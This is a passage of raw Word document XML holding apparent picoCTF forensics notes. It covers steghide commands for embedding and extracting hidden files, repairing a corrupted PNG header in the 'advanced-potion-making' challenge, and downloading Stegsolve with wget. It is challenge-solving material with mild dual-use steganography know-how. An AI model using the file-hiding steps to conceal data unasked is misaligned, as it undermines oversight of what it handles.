          <w:t>https://github.com/vivian-dai/PicoCTF2021-Writeup/blob/main/Forensics/Trivial%20Flag%20Transfer%20Protocol/Trivial%20Flag%20Transfer%20Protocol.md</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="2272C792" w14:textId="54999D4D" w:rsidR="002D6730" w:rsidRDefault="002D6730" w:rsidP="00E43273">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">embed file </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B6F5417" w14:textId="342EF079" w:rsidR="002D6730" w:rsidRDefault="002D6730" w:rsidP="00E43273">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI Emoji" w:hAnsi="Segoe UI Emoji"/>
          <w:color w:val="404040"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>steghide</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI Emoji" w:hAnsi="Segoe UI Emoji"/>
          <w:color w:val="404040"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> embed -</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI Emoji" w:hAnsi="Segoe UI Emoji"/>
          <w:color w:val="404040"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>cf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图片文件载体</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI Emoji" w:hAnsi="Segoe UI Emoji"/>
          <w:color w:val="404040"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>] -</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI Emoji" w:hAnsi="Segoe UI Emoji"/>
          <w:color w:val="404040"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>ef</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI Emoji" w:hAnsi="Segoe UI Emoji"/>
          <w:color w:val="404040"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> [</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun" w:hint="eastAsia"/>
          <w:color w:val="404040"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>待隐藏文件</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI Emoji" w:hAnsi="Segoe UI Emoji"/>
          <w:color w:val="404040"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D8EBEC8" w14:textId="21E13062" w:rsidR="002D6730" w:rsidRDefault="002D6730" w:rsidP="00E43273">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">check if file </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>embeded</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65F2DD33" w14:textId="0B7FCDCD" w:rsidR="00604D66" w:rsidRDefault="002D6730" w:rsidP="00E43273">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minor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info picture1.bmp</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4106E39A" w14:textId="40565247" w:rsidR="002D6730" w:rsidRDefault="002D6730" w:rsidP="00E43273">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5B18E8B2" w14:textId="77777777" w:rsidR="002D6730" w:rsidRDefault="002D6730" w:rsidP="002D6730">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>extract file</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59D9A9A7" w14:textId="1670855B" w:rsidR="002D6730" w:rsidRDefault="002D6730" w:rsidP="002D6730">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="002D6730">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>steghide</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="002D6730">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>extract -sf</w:t>
      </w:r>
      <w:r w:rsidRPr="002D6730">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve"> picture1.bmp</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A9F44A2" w14:textId="77777777" w:rsidR="002D6730" w:rsidRDefault="002D6730" w:rsidP="00E43273">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="045EFAF6" w14:textId="7C1E8F11" w:rsidR="00527C9A" w:rsidRDefault="00527C9A" w:rsidP="00E43273">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3B636C32" w14:textId="703A9F17" w:rsidR="00527C9A" w:rsidRDefault="00527C9A" w:rsidP="00E43273">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="172B0A9B" w14:textId="77777777" w:rsidR="00527C9A" w:rsidRDefault="00527C9A" w:rsidP="00527C9A">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0"/>
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Open Sans"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="1D253B"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Open Sans"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="1D253B"/>
        </w:rPr>
        <w:t>advanced-potion-making</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69429FF7" w14:textId="77777777" w:rsidR="00527C9A" w:rsidRDefault="00527C9A" w:rsidP="00527C9A">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="212121"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="212121"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t> | 100 points</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BFFC7C2" w14:textId="77777777" w:rsidR="00527C9A" w:rsidRDefault="00527C9A" w:rsidP="00527C9A">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="212121"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="212121"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>Tags: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="212121"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>picoMini</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="212121"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t xml:space="preserve"> by </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="212121"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>redpwnForensics</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="5E9F2F12" w14:textId="77777777" w:rsidR="00527C9A" w:rsidRDefault="00527C9A" w:rsidP="00527C9A">
      <w:pPr>
        <w:pStyle w:val="body-sm"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="75" w:afterAutospacing="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:caps/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:caps/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>AUTHOR: BIGC</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BDDBE53" w14:textId="77777777" w:rsidR="00527C9A" w:rsidRDefault="00527C9A" w:rsidP="00527C9A">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0"/>
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Open Sans"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="1D253B"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Open Sans"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="1D253B"/>
        </w:rPr>
        <w:t>Description</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24DB4880" w14:textId="77777777" w:rsidR="00527C9A" w:rsidRDefault="00527C9A" w:rsidP="00527C9A">
      <w:pPr>
        <w:pStyle w:val="body-md"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="75" w:afterAutospacing="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>Ron just found his own copy of advanced potion making, but its been corrupted by some kind of spell. Help him recover it!</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4AA39AC8" w14:textId="5A4976A8" w:rsidR="00527C9A" w:rsidRDefault="00527C9A" w:rsidP="00E43273">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="5969F6"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>advanced-potion-making</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="682C073D" w14:textId="0AC6A55A" w:rsidR="00527C9A" w:rsidRDefault="00527C9A" w:rsidP="00E43273">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>For recover a file, we need hex editor</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="293B337B" w14:textId="69346974" w:rsidR="00527C9A" w:rsidRDefault="00A15E3A" w:rsidP="00E43273">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="1ABE7E34" wp14:editId="74450119">
            <wp:extent cx="6332220" cy="87376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81"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6332220" cy="873760"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A6FE371" w14:textId="30BBFD86" w:rsidR="00527C9A" w:rsidRDefault="00A15E3A" w:rsidP="00E43273">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>It seems like a .</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>png</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="36F9D07A" w14:textId="4E27631E" w:rsidR="00A15E3A" w:rsidRDefault="00A15E3A" w:rsidP="00E43273">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>C</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>ompare it with a random .</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>png</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve"> file</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6ADB1B38" w14:textId="5A742081" w:rsidR="00A15E3A" w:rsidRDefault="00A15E3A" w:rsidP="00E43273">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">The header hex are </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>different.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>W</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve"> change the first line according to the random normal .</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>png</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve"> file.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68327288" w14:textId="4A302FE4" w:rsidR="00A15E3A" w:rsidRDefault="00A15E3A" w:rsidP="00E43273">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="35AA08E8" wp14:editId="57248645">
            <wp:extent cx="4816257" cy="609653"/>
            <wp:effectExtent l="0" t="0" r="381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74"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="4816257" cy="609653"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="367D8967" w14:textId="7B5B3106" w:rsidR="00527C9A" w:rsidRDefault="00F8797D" w:rsidP="00E43273">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F8797D">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>89 50 4E 47  0D 0A 1A 0A   00 00 00 0D  49 48 44 52</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7474BA0C" w14:textId="51C60FFD" w:rsidR="00F8797D" w:rsidRDefault="00F8797D" w:rsidP="00E43273">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>A</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>nd save it as advanced.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CB86E81" w14:textId="366040F1" w:rsidR="00F8797D" w:rsidRDefault="00F8797D" w:rsidP="00E43273">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="254665F2" wp14:editId="18C1BC53">
            <wp:extent cx="6127011" cy="1958510"/>
            <wp:effectExtent l="0" t="0" r="7620" b="381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a:blip r:embed="rId182"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6127011" cy="1958510"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="25A823D6" w14:textId="77777777" w:rsidR="00F8797D" w:rsidRDefault="00F8797D" w:rsidP="00E43273">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7712D0E8" w14:textId="4BCB2FD3" w:rsidR="00527C9A" w:rsidRDefault="00527C9A" w:rsidP="00E43273">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>S</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>tegsolve</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve"> install and how to run </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B1AE38A" w14:textId="46433A00" w:rsidR="00527C9A" w:rsidRDefault="00527C9A" w:rsidP="00E43273">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00527C9A">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>wget</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00527C9A">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve"> http://www.caesum.com/handbook/Stegsolve.jar -O stegsolve.jar&amp;&amp;</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00527C9A">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>chmod</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00527C9A">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve"> +x stegsolve.jar&amp;&amp;</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00527C9A">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>mkdir</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00527C9A">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve"> bin&amp;&amp;mv stegsolve.jar bin/</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C14E8D8" w14:textId="290BEEF6" w:rsidR="00527C9A" w:rsidRDefault="00527C9A" w:rsidP="00E43273">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>run : ./stegsolve.jar</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49DB14DB" w14:textId="3A5AC5FF" w:rsidR="00F8797D" w:rsidRDefault="00F8797D" w:rsidP="00E43273">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">open the advanced.png file in it. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>W</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
